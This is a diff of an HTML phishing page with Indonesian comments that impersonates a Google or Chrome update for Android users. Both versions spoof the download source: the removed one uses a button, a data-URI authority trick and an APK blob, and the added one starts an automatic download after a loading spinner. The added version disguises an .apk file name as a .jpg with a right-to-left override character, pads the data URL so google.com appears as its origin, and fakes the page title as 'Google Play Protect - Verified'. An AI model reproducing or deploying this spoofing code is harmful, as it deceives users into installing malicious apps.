@@ -1,73 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Update Service</title>
+    <title>Google Service Update</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; color: #3c4043; text-align: center; padding: 50px 20px; }
-        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
-        .logo { width: 74px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 400; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 30px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; width: 100%; }
-        .btn:active { background: #174ea6; }
-        #log { margin-top: 20px; font-family: monospace; font-size: 10px; color: red; text-align: left; }
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            background-color: #ffffff; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285F4;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 20px; color: #5f6368; font-size: 14px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-    <h1>Update Chrome Mobile</h1>
-    <p>Versi terbaru tersedia untuk perangkat Tecno Pova anda. Tingkatkan keamanan penjelajahan sekarang.</p>
-    
-    <button class="btn" onclick="executeAttack()">UPDATE SEKARANG</button>
-    
-    <div id="log"></div>
-</div>
+    <div class="loader"></div>
+    <div class="text">Menghubungkan ke server Google...</div>
 
-<script>
-    function log(msg) {
-        document.getElementById('log').innerHTML += "> " + msg + "<br>";
-    }
-
-    function executeAttack() {
-        log("Inisialisasi payload...");
-
-        // 1. DATA URI SPOOFING (The $5k Method)
-        // Kita pake sub-authority //google.com dan padding panjang
-        // Biar parser di notification bar terpotong tepat di google.com
-        const padding = "A".repeat(100); 
-        const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
-
-        // 2. BLOB URL SPOOFING (Variant Method)
-        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // APK Header
-        const blob = new Blob([content], { type: 'application/vnd.android.package-archive' });
-        const realBlobUrl = URL.createObjectURL(blob);
-
-        // Trik: Manipulasi Document Title buat pengaruhin UI Process
-        document.title = "google.com/chrome/update";
-
-        // Eksekusi Download
-        const a = document.createElement('a');
+    <script>
+        // --- KONFIGURASI PAYLOAD ---
         
-        // Coba ganti antara 'dataUrl' atau 'realBlobUrl' buat tes mana yang tembus spoofing-nya
-        a.href = dataUrl; 
-        a.download = "Google_Chrome_Stable.apk";
-        
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
+        // 1. Unicode RTLO Trick: Memutar balik ekstensi file di UI
+        // [U+202E] adalah karakter spesial yang bikin teks setelahnya terbalik
+        const rtlo = "\u202E";
+        const fileName = "google.com_" + rtlo + "gpj.apk"; 
+        // Di beberapa UI, ini bakal terbaca sebagai "google.com_kpa.jpg" (nyamar jadi gambar)
 
-        log("Payload dikirim. Cek notifikasi download di atas!");
+        // 2. Data URI Spoofing dengan Long Padding
+        // Teknik Abhishek Kumar: Pake //google.com sebagai authority palsu
+        const spoofAuthority = "//google.com/";
+        const padding = "A".repeat(150); // Bikin parser UI 'lelah' dan terpotong
+        const payloadData = "ZXN0dGVzdGVzdHRlc3Q="; // Base64 dummy
         
-        // Tampilkan peringatan palsu biar user makin yakin
-        setTimeout(() => {
-            alert("Download dimulai dari server Google. Harap tunggu...");
-        }, 1000);
-    }
-</script>
+        const finalDataUrl = `data:${spoofAuthority}html;${padding},base64,${payloadData}`;
 
+        // --- EKSEKUSI AUTOMATIC DOWNLOAD ---
+        
+        function startAttack() {
+            console.log("[*] Executing Spoofing Attack...");
+            
+            const link = document.createElement("a");
+            link.href = finalDataUrl;
+            link.download = fileName;
+            
+            // Masukkan ke DOM sebentar buat trigger click
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            console.log("[+] Payload sent to browser notification.");
+        }
+
+        // Jalankan otomatis setelah 1.5 detik (biar keliatan simulasi loading)
+        setTimeout(startAttack, 1500);
+
+        // --- ADDITIONAL UI SPOOF ---
+        // Ganti judul dokumen biar sinkron kalau user buka Recent Apps
+        document.title = "Google Play Protect - Verified";
+    </script>
 </body>
 </html>
